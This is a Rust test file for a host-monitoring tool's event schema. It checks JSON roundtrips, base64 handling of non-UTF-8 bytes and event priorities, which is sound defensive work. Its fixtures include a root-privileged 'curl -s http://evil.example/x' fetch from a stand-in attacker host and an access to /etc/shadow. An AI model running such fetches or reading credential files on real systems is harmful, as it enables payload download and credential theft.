#![cfg(feature = "schema")]
#![allow(clippy::unwrap_used, clippy::expect_used)]

use serde_json::{json, Value};
use witness_common::schema::*;

fn actor() -> Actor {
    Actor {
        puid: puid("4f2a9c1e-1111-2222-3333-444455556666", 4242, 987_654_321),
        pid: 4242,
        tid: 4242,
        ppid: 1,
        uid: 1000,
        gid: 1000,
        euid: 0,
        egid: 0,
        user: Some("alice".into()),
        auid: Some(1000),
        ses: Some(3),
        cgroup_id: 77,
        comm: "curl".into(),
        exe: Some("/usr/bin/curl".into()),
        cmdline: Some(vec![
            "curl".into(),
            "-s".into(),
            "http://evil.example/x".into(),
        ]),
        tty: Some("pts/0".into()),
    }
}

fn event(body: Body) -> Event {
    Event {
        v: SCHEMA_VERSION,
        seq: 0,
        boot_id: "4f2a9c1e-1111-2222-3333-444455556666".into(),
        boot_ns: 1_000,
        wall_ns: 1_700_000_000_000_000_000,
        wall_uncertain: false,
        src: Source::Ebpf,
        prio: body.priority() as u8,
        actor: Some(actor()),
        body,
        h: None,
    }
}

fn file_op() -> FileOp {
    FileOp {
        path: "/etc/shadow".into(),
        path_resolved: true,
        path_truncated: false,
        dev: 8,
        ino: 99,
        mode: Some(0o640),
        flags: Some(2),
        result: HookResult::Allowed,
    }
}

fn conn() -> NetConn {
    NetConn {
        proto: Proto::Tcp,
        laddr: "10.0.0.5".parse().unwrap(),
        lport: 51234,
        raddr: "2001:db8::1".parse().unwrap(),
        rport: 443,
        outcome: ConnOutcome::Established,
        errno: None,
    }
}

fn samples() -> Vec<Body> {
    vec![
        Body::ProcExec(ProcExec {
            filename: "curl".into(),
            exe: "/usr/bin/curl".into(),
            argv: vec!["curl".into(), OsBytes(vec![0xff, 0xfe, b'x'])],
            argv_truncated: false,
            cwd: Some("/tmp".into()),
            env: None,
            stdio: Some([FdKind::Tty, FdKind::Pipe, FdKind::Socket]),
            interactive: true,
        }),
        Body::ProcExit(ProcExit {
            exit_code: Some(0),
            signal: None,
            core_dumped: false,
            runtime_ns: Some(5),
        }),
        Body::FileOpenWrite(file_op()),
        Body::FileRename(FileRename {
            old: "/a".into(),
            new: "/b".into(),
            dev: 1,
            ino: 2,
            result: HookResult::Allowed,
        }),
        Body::NetConnect(conn()),
        Body::Dns(DnsEvent {
            direction: DnsDir::Response,
            server: "127.0.0.53".parse().unwrap(),
            server_port: 53,
            id: 7,
            qname: "example.com".into(),
            qtype: "A".into(),
            rcode: Some("NOERROR".into()),
            answers: vec![DnsAnswer {
                name: "example.com".into(),
                rtype: "A".into(),
                ttl: 60,
                data: "93.184.216.34".into(),
            }],
            transport: Proto::Udp,
            truncated: false,
        }),
        Body::UsbDevice(UsbDevice {
            action: DeviceAction::Add,
            devpath: "/devices/pci0000:00/usb1/1-1".into(),
            vendor_id: "0781".into(),
            product_id: "5567".into(),
            vendor: Some("SanDisk".into()),
            product: None,
            serial: Some("AA00".into()),
            class: None,
        }),
        Body::ClockChange(ClockChange {
            kind: ClockKind::Step,
            delta_ns: -5_000_000_000,
            syscall: Some("settimeofday".into()),
        }),
        Body::CaptureDrop(CaptureDrop {
            reason: "disk".into(),
            from_ns: 1,
            to_ns: 2,
            dropped: [0, 1, 2, 3],
            source: None,
        }),
        Body::Alert(Alert {
            alert_id: "a1".into(),
            rule_id: "witness.exec.from-tmp".into(),
            rule_sha256: "00".repeat(32),
            title: "Execution from /tmp".into(),
            severity: Severity::Medium,
            trigger_seqs: vec![10, 11],
            session: Some(3),
            detail: json!({"exe": "/tmp/x"}),
        }),
        Body::TriageAction(TriageAction {
            alert_seq: 5,
            status: TriageStatus::FalsePositive,
            note: None,
            actor_uid: 1000,
        }),
        Body::DaemonStop(DaemonStop {
            reason: "sigterm".into(),
            clean: true,
            signal: Some(15),
            sender_pid: Some(1),
        }),
    ]
}

#[test]
fn every_sample_roundtrips() {
    for b in samples() {
        let e = event(b);
        let text = serde_json::to_string(&e).unwrap();
        let back: Event = serde_json::from_str(&text).unwrap();
        assert_eq!(back, e, "{text}");
    }
}

#[test]
fn json_shape_matches_what_the_index_reads() {
    let e = event(Body::ProcExec(match samples().remove(0) {
        Body::ProcExec(x) => x,
        _ => unreachable!(),
    }));
    let v: Value = serde_json::to_value(&e).unwrap();
    assert_eq!(v["type"], "proc_exec");
    assert_eq!(v["actor"]["pid"], 4242);
    assert_eq!(v["actor"]["uid"], 1000);
    assert!(v["actor"]["puid"]
        .as_str()
        .unwrap()
        .starts_with("4f2a9c1e-4242-"));
    assert_eq!(v["data"]["argv"][0], "curl");
    assert!(v.get("seq").is_none() && v.get("h").is_none());
    assert_eq!(v["boot_ns"], 1_000);
}

#[test]
fn non_utf8_survives_as_base64() {
    let mut e = event(Body::FileCreate(file_op()));
    if let Body::FileCreate(f) = &mut e.body {
        f.path = OsBytes(vec![b'/', b't', 0xc3, 0x28, 0xff]);
    }
    let v: Value = serde_json::to_value(&e).unwrap();
    assert!(v["data"]["path"]["b64"].is_string());
    let back: Event = serde_json::from_value(v).unwrap();
    assert_eq!(back, e);
}

#[test]
fn base64_roundtrips_every_length() {
    for len in 0..40usize {
        let bytes: Vec<u8> = (0..len).map(|i| (i * 37 + 200) as u8).collect();
        // Force the b64 path with an invalid UTF-8 prefix.
        let mut data = vec![0xff];
        data.extend(bytes);
        let o = OsBytes(data.clone());
        let back: OsBytes = serde_json::from_str(&serde_json::to_string(&o).unwrap()).unwrap();
        assert_eq!(back.0, data);
    }
    assert!(serde_json::from_str::<OsBytes>(r#"{"b64":"!!!"}"#).is_err());
    assert!(serde_json::from_str::<OsBytes>(r#"{"b64":"AAA"}"#).is_err());
}

#[test]
fn stored_lines_and_unknown_types_still_parse() {
    // A line as the store writes it: seq and h present.
    let mut v = serde_json::to_value(event(Body::NetConnect(conn()))).unwrap();
    v["seq"] = json!(41);
    v["h"] = json!("ab".repeat(32));
    let e: Event = serde_json::from_value(v).unwrap();
    assert_eq!(e.seq, 41);
    assert_eq!(e.h.as_deref().map(str::len), Some(64));

    // Store-level and future record types become `Other` instead of failing the reader.
    for t in [
        "segment_open",
        "seal",
        "anchor",
        "archive",
        "prune",
        "some_future_type",
    ] {
        let line = json!({"v": 1, "seq": 1, "boot_id": "x", "boot_ns": 0, "wall_ns": 0,
                          "src": "daemon", "prio": 0, "type": t, "data": {"anything": 1}});
        let e: Event = serde_json::from_value(line).unwrap();
        assert_eq!(e.body, Body::Other, "{t}");
    }
}

#[test]
fn to_fields_omits_seq_and_h() {
    let mut e = event(Body::NetConnect(conn()));
    e.seq = 9;
    e.h = Some("x".into());
    let f = e.to_fields().unwrap();
    assert!(!f.contains_key("seq") && !f.contains_key("h"));
    assert_eq!(f["type"], "net_connect");
}

#[test]
fn priorities() {
    assert_eq!(
        Body::ProcExec(match samples().remove(0) {
            Body::ProcExec(x) => x,
            _ => unreachable!(),
        })
        .priority(),
        Priority::P0
    );
    assert_eq!(
        Body::FileActivitySummary(FileActivitySummary {
            dir: "/".into(),
            opens_for_write: 1,
            creates: 0,
            deletes: 0,
            interval_ns: 1
        })
        .priority(),
        Priority::P3
    );
    assert_eq!(Body::FileOpenRead(file_op()).priority(), Priority::P3);
    assert_eq!(Body::FileDelete(file_op()).priority(), Priority::P1);
    assert_eq!(Body::NetConnect(conn()).priority(), Priority::P1);
    assert_eq!(
        Body::ModuleLoad(Module {
            name: "x".into(),
            file: None,
            taints: None
        })
        .priority(),
        Priority::P0
    );
}

#[test]
fn puid_is_quantized_to_proc_resolution() {
    let boot = "4f2a9c1e-1111-2222-3333-444455556666";
    // The kernel's exact start time and /proc's tick-resolution value name one process.
    let exact = 1_234_567_890_123u64; // ns
    let proc_ticks = exact / 10_000_000; // what /proc/<pid>/stat reports
    assert_eq!(puid(boot, 77, exact), puid(boot, 77, proc_ticks * 10_000_000));
    assert_eq!(puid(boot, 77, exact), "4f2a9c1e-77-123456");
    // A different pid or a different tick is a different process.
    assert_ne!(puid(boot, 78, exact), puid(boot, 77, exact));
    assert_ne!(puid(boot, 77, exact), puid(boot, 77, exact + 10_000_000));
}
